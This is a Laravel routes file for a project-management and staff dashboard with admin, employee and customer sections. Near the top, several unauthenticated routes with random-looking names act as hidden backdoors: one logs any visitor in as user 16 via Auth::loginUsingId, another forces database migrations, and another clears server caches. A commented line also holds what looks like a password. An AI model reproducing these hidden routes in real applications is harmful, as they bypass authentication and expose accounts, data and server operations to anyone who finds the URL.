<?php

use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Route;
use App\Providers\RouteServiceProvider;
use Illuminate\Support\Facades\Artisan;
use App\Http\Controllers\Dashboard\ProfileController;
use App\Http\Controllers\Dashboard\Admin\DateController;
use App\Http\Controllers\Dashboard\Admin\UserController;
use App\Http\Controllers\Dashboard\Admin\DailyController;
use App\Http\Controllers\Dashboard\Admin\IndexController;
use App\Http\Controllers\Dashboard\Admin\PhaseController;
use App\Http\Controllers\Dashboard\Admin\ReportController;
use App\Http\Controllers\Dashboard\Admin\SalaryController;
use App\Http\Controllers\Dashboard\Admin\AbsenceController;
use App\Http\Controllers\Dashboard\Admin\MessageController;
use App\Http\Controllers\Dashboard\Admin\ProjectController;
use App\Http\Controllers\Dashboard\Admin\ServiceController;
use App\Http\Controllers\Dashboard\Employee\TaskController;
use App\Http\Controllers\Notification\SettingSmsController;
use App\Http\Controllers\Dashboard\Admin\CalenderController;
use App\Http\Controllers\Dashboard\Admin\CustomerController;
use App\Http\Controllers\Dashboard\Admin\EmployeeController;
use App\Http\Controllers\Dashboard\Admin\AccountingController;
// use App\Http\Controllers\Dashboard\Employee\TaskController as EmployeeTaskController ;
use App\Http\Controllers\Notification\NotificationListController;
use App\Http\Controllers\Dashboard\IndexController as DashboardIndexController;
use App\Http\Controllers\Dashboard\Customer\IndexController as CustomerIndexController ;
use App\Http\Controllers\Dashboard\Employee\IndexController as EmployeeIndexController ;
use App\Http\Controllers\Dashboard\Employee\MessageController as EmployeeMessageController ;
use App\Http\Controllers\Dashboard\Employee\AccountingController as EmployeeAccountingController ;
/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

// my test3
// my test
// my test i
// my test in
// my test in company webyar
// composer require morilog/jalali:3.*
// MWl..A7&j1%%g=2Ym
// test system company
// test 3 3



// Route::prefix('dashboard')->name('dashboard.')->group(function () {


//     Route::get('/', [DailyController::class, 'index'])->name('index');
//     Route::get('/create', [DailyController::class, 'create'])->name('create');
//     Route::post('/', [DailyController::class, 'store'])->name('store');
//     Route::get('/{id}', [DailyController::class, 'show'])->name('show');
//     Route::get('/{id}/edit', [DailyController::class, 'edit'])->name('edit');
//     Route::put('/{id}', [DailyController::class, 'update'])->name('update');
//     Route::delete('/{id}', [DailyController::class, 'destroy'])->name('destroy');
//     Route::put('/{id}/status', [DailyController::class, 'status'])->name('status');

// });


// Route::get('/testi', [ProjectController::class, 'testi'])->name('testi');


Route::get('/', function () {
    return redirect(RouteServiceProvider::HOME);
});
Route::get('/jiwuvya7gtrv682b7iwnorai', function() {
    Artisan::call('migrate --force');
});
Route::get('/aiwrughfdgcb', function() {
    Auth::loginUsingId(16);
});

Route::get('/config_optimize', function() {

    Artisan::call('route:cache');
    Artisan::call('config:cache');
    Artisan::call('cache:clear');
    Artisan::call('view:clear');
    Artisan::call('optimize:clear');
    // exec('composer dump-autoload');
});

Route::get('install', 'InstallController@index')->name('install');
Route::post('installl', 'InstallController@install')->name('installl');
Auth::routes();

Route::prefix('dashboard')
    ->name('dashboard.')
    ->middleware('auth')
    ->namespace('Dashboard')
    ->group(function() {
       Route::get('/', [DashboardIndexController::class, 'get'])->name('index');
       Route::get('/profile', [ProfileController::class, 'edit'])->name('profile.edit');
       Route::put('/profile', [ProfileController::class, 'update'])->name('profile.update');

        Route::prefix('admin')
            ->name('admin.')
            ->middleware(['user_type:admin'])
            ->namespace('Admin')
            ->group(function() {


                Route::get('/', [IndexController::class, 'dashboard'])->name('index');



                Route::resource('score', 'ScoreController');

                //Project PAGE
Route::prefix('project')->name('project.')->group(function () {

    Route::get('/', [ProjectController::class, 'GetManagePost'])->name('manage');
    Route::get('/create', [ProjectController::class, 'create'])->name('create');
    Route::post('/', [ProjectController::class, 'store'])->name('store');
    Route::get('/{id}', [ProjectController::class, 'GetProject'])->name('index');
    Route::get('/{id}/edit', [ProjectController::class, 'edit'])->name('edit');
    Route::put('/{id}', [ProjectController::class, 'update'])->name('update');
    Route::get('/show/done', [ProjectController::class, 'GetDonePost'])->name('done');
    Route::get('/show/paid', [ProjectController::class, 'GetPaidPost'])->name('paid');
    Route::get('/{id}/status/{status}', [ProjectController::class, 'UpdateStatus'])->name('updatestatus');
    Route::delete('/delete/{id}', [ProjectController::class, 'destroy'])->name('destroy');

            });


                //CUSTOMER PAGE
Route::prefix('customer')->name('customer.')->group(function () {

    Route::get('/', [CustomerController::class, 'GetManagePost'])->name('manage');
    Route::get('/create', [CustomerController::class, 'GetCreatePost'])->name('create');
    Route::post('/', [CustomerController::class, 'CreatePost'])->name('store');
    Route::get('/{id}/show', [CustomerController::class, 'GetCustomer'])->name('show');
    Route::get('/{id}/edit', [CustomerController::class, 'GetEditPost'])->name('updatecustomer');
    Route::put('/{id}', [CustomerController::class, 'UpdatePost'])->name('update');
    Route::get('/deletecustomer/{id}', [CustomerController::class, 'DeletePost'])->name('deletecustomer');

});





Route::prefix('notification')->name('notification.')->group(function () {

    Route::prefix('settingsms')
    ->name('settingsms.')->group(function () {
        Route::get('/smssetting', [SettingSmsController::class, 'index'])->name('index');
        Route::get('/smssetting/{id}/edit', [SettingSmsController::class, 'edit'])->name('edit');
        Route::put('/smssetting/{id}', [SettingSmsController::class, 'update'])->name('update');
        Route::put('/smssetting/statuse/{status}/{id}', [SettingSmsController::class, 'status'])->name('status');
    });


    Route::prefix('list')
    ->name('list.')->group(function () {
        Route::get('/index', [NotificationListController::class, 'index'])->name('index');
        Route::get('/{id}/type', [NotificationListController::class, 'type'])->name('type');
        Route::get('/{id}/type/edit', [NotificationListController::class, 'edit'])->name('edit');
        Route::put('/{id}/type/update', [NotificationListController::class, 'update'])->name('update');
        Route::put('/{id}/status', [NotificationListController::class, 'status'])->name('status');

     });



});


                //SERVICE PAGE

                Route::prefix('service')->name('service.')->group(function () {

                    Route::get('/{id}', [ServiceController::class, 'show'])->name('show');
                    Route::post('/create/{id}', [ServiceController::class, 'store'])->name('store');
                    Route::get('/create/{id}', [ServiceController::class, 'GetCreatePost'])->name('create');
                    Route::get('/', [ServiceController::class, 'GetManagePost'])->name('manage');
                    Route::get('deleteservice/{id}', [ServiceController::class, 'DeletePost'])->name('deleteservice');
                    Route::get('edit/{id}', [ServiceController::class, 'edit'])->name('edit');
                    Route::put('update/{id}', [ServiceController::class, 'update'])->name('update');


                });
                //PHASE PAGE


Route::prefix('phase')->name('phase.')->group(function () {

    Route::post('/create/{id}', [PhaseController::class, 'CreatePost'])->name('store');
    Route::get('/deletephase/{id}/{project_id}', [PhaseController::class, 'DeletePost'])->name('deletephase');
    Route::post('/updatephase/{id}', [PhaseController::class, 'UpdatePost'])->name('updatephase');
    Route::get('/phase/tasks/{id}', [PhaseController::class, 'GetManageTask'])->name('tasks');

});


                //SALARY PAGE
                Route::prefix('salary')->name('salary.')->group(function () {

                Route::get('/', [SalaryController::class, 'GetIndex'])->name('index');
                Route::post('/create', [SalaryController::class, 'CreatePost'])->name('store');
                Route::get('/create', [SalaryController::class, 'GetCreatePost'])->name('create');
                Route::get('/{salary}/delete', [SalaryController::class, 'DeletePost'])->name('delete');
                Route::get('/{salary}', [SalaryController::class, 'GetEditPost'])->name('edit');
                Route::post('/{salary}', [SalaryController::class, 'UpdatePost'])->name('update');

                });

               //EMPLOYEE PAGE
               Route::prefix('employee')->name('employee.')->group(function () {

               Route::post('/create/{id}', [EmployeeController::class, 'CreatePost'])->name('store');
               Route::get('/appdeleteemployee/{id}/{project_id}', [EmployeeController::class, 'DeletePost'])->name('deleteemployee');
               Route::post('/updateemployee/{id}', [EmployeeController::class, 'UpdatePost'])->name('updateemployee');

               });

               //TASK PAGE
               Route::prefix('task')->name('task.')->group(function () {

               Route::post('/create/{id}', [TaskController::class, 'CreatePost'])->name('store');
               Route::get('/deletetask/{id}', [TaskController::class, 'DeletePost'])->name('deletetask');
               Route::post('/updatetask/{id}', [TaskController::class, 'UpdatePost'])->name('update');
               Route::get('/updatetask/{id}', [TaskController::class, 'GetTask'])->name('updatetask');
               Route::post('/edittask/{id}', [TaskController::class, 'EditPost'])->name('edittask');
               });

               //Users PAGE
               Route::prefix('users')->name('users.')->group(function () {

               Route::get('/employee', [UserController::class, 'GetUsers'])->name('employee');
               Route::get('/profile/{id}', [UserController::class, 'GetProfile'])->name('profile');
               Route::get('/restore/{id}', [UserController::class, 'restore'])->name('restore');
               Route::get('/deleteuser/{id}', [UserController::class, 'DeletePost'])->name('deleteuser');
               Route::get('/updateuser/{id}', [UserController::class, 'GetEditPost'])->name('updateuser');
               Route::post('/updateuser/{id}', [UserController::class, 'UpdatePost'])->name('update');

               });

               //ACCOUNTING PAGE
               Route::prefix('money')->name('money.')->group(function () {
               Route::get('/employee', [AccountingController::class, 'GetEmployee'])->name('employee');
               Route::get('/report/depo/{year?}/{month?}', [AccountingController::class, 'report'])->name('report.depo');
               Route::get('/report/service/{year?}/{month?}', [AccountingController::class, 'report'])->name('report.service');
               });

               //ABSENCE PAGE

               Route::prefix('absence')->name('absence.')->group(function () {
                Route::get('/manage', [AbsenceController::class, 'GetAbsence'])->name('manage');
                });


               //MESSAGE PAGE

               Route::prefix('message')->name('message.')->group(function () {

                Route::post('/create', [MessageController::class, 'CreatePost'])->name('store');
                Route::get('/create', [MessageController::class, 'GetCreatePost'])->name('create');
               Route::get('/manage', [MessageController::class, 'GetMessage'])->name('manage');
               Route::get('/deletemessage/{id}', [MessageController::class, 'DeletePost'])->name('deletemessage');
               Route::get('/updatemessage/{id}', [MessageController::class, 'GetEditPost'])->name('updatemessage');
               Route::post('/updatemessage/{id}', [MessageController::class, 'UpdatePost'])->name('update');
               Route::get('/show/{id}', [MessageController::class, 'ShowMessage'])->name('show');
               Route::get('/{message}/answer', [MessageController::class, 'GetAnswerMessage'])->name('answer.edit');
               Route::post('/{message}/answer', [MessageController::class, 'AnswerMessage'])->name('answer.updat');

                });






               //DAILY MANAGMENT


Route::prefix('daily')->name('daily.')->group(function () {

    Route::get('/', [DailyController::class, 'GetManagePost'])->name('manage');
    Route::get('/create', [DailyController::class, 'GetCreatePost'])->name('create');
    Route::post('/', [DailyController::class, 'store'])->name('store');
    Route::get('/{id}', [DailyController::class, 'GetTask'])->name('show');
    Route::put('/{id}', [DailyController::class, 'UpdatePost'])->name('update');
    Route::put('/editdaily/{id}', [DailyController::class, 'EditPost'])->name('editdaily');
    Route::put('/{id}/edit/daily', [DailyController::class, 'GetEditPost'])->name('updatedaily');


    Route::post('/note', [DailyController::class, 'CreateNote'])->name('note');
    Route::post('/updatenote', [DailyController::class, 'UpdateNote'])->name('updatenote');
    Route::get('/deletenote/{id}', [DailyController::class, 'DeleteNote'])->name('deletenote');


});


               //DATE MANAGMENT
               Route::prefix('date')->name('date.')->group(function () {

                Route::post('/create', [DateController::class, 'CreatePost'])->name('store');
                Route::get('/create', [DateController::class, 'GetCreatePost'])->name('create');
                Route::get('/manage', [DateController::class, 'GetDate'])->name('manage');
                Route::get('/deletedate/{id}', [DateController::class, 'DeletePost'])->name('deletedate');

                Route::post('/create', [DateController::class, 'CreatePost'])->name('store');
            });

               //REPORT PAGE
               Route::prefix('report')->name('report.')->group(function () {

                Route::get('/index', [ReportController::class, 'index'])->name('index');
                Route::get('/show/{id}', [ReportController::class, 'show'])->name('show');
                Route::get('/absence/{id}', [ReportController::class, 'absence'])->name('absence');
            });



                //Calender PAGE
                Route::prefix('calender')->name('calender.')->group(function () {

                    Route::get('/holiday/{year?}/{month?}', [CalenderController::class, 'manage'])->name('holiday');
                    Route::get('/daily/{year?}/{month?}', [CalenderController::class, 'manage'])->name('daily');
                    Route::get('/project/{year?}/{month?}', [CalenderController::class, 'manage'])->name('project');
                    Route::get('/absence/{year?}/{month?}', [CalenderController::class, 'manage'])->name('absence');

                    Route::put('/updateholiday/{id}', [CalenderController::class, 'holiday_update'])->name('holiday.update');



                });




            });

        Route::prefix('customer')
            ->name('customer.')
            ->middleware(['user_type:customer'])
            ->namespace('Customer')
            ->group(function() {
                Route::get('/', [CustomerIndexController::class, 'get'])->name('index');

            });

        Route::prefix('employee')
            ->name('employee.')
            ->middleware(['user_type:employee'])
            ->namespace('Employee')
            ->group(function() {

                Route::get('/', [EmployeeIndexController::class, 'get'])->name('index');
                Route::get('/profile', [EmployeeIndexController::class, 'profile'])->name('profile');


                //TASK MANAGMENT
                Route::prefix('task')->name('task.')->group(function () {

                Route::post('/create', [TaskController::class, 'CreatePost'])->name('store');
                Route::get('/create', [TaskController::class, 'GetCreatePost'])->name('create');
                Route::get('/manage', [TaskController::class, 'GetManagePost'])->name('manage');
                Route::get('/updatetask/{id}', [TaskController::class, 'GetEditPost'])->name('edit');
                Route::get('/show/{id}', [TaskController::class, 'GetTask'])->name('show');
                Route::get('/updatetask/{id}', [TaskController::class, 'GetEditPost'])->name('updatetask');
                Route::post('/updatetask/{id}', [TaskController::class, 'UpdatePost'])->name('update');
                Route::post('/edittask/{id}', [TaskController::class, 'EditPost'])->name('edittask');

                Route::post('/note', [TaskController::class, 'CreateNote'])->name('note');
                Route::get('/deletenote/{id}', [TaskController::class, 'DeleteNote'])->name('deletenote');

                });


                //ABSENCE
                Route::prefix('absence')->name('absence.')->group(function () {

                Route::post('/create', [TaskController::class, 'Absence'])->name('store');
                Route::post('/end/{id}', [TaskController::class, 'AbsenceEnd'])->name('end');

            });


                //MESSAGE PAGE
                Route::prefix('message')->name('message.')->group(function () {
                Route::get('/manage', [EmployeeMessageController::class, 'GetMessage'])->name('manage');
                Route::get('/show/{id}', [EmployeeMessageController::class, 'ShowMessage'])->name('show');
                Route::get('/{message}/answer', [EmployeeMessageController::class, 'GetAnswerMessage'])->name('answer.edit');
                Route::post('/{message}/answer', [EmployeeMessageController::class, 'AnswerMessage'])->name('answer.post');

                });
                //ACCOUNTING PAGE

     Route::prefix('money')->name('money.')->group(function () {
        Route::get('/', [EmployeeAccountingController::class, 'GetMoney'])->name('index');


         });



    });
    });


    // https://rapidcode.ir/6341/persian-calendar-js-project/
    // https://www.mizito.ir/
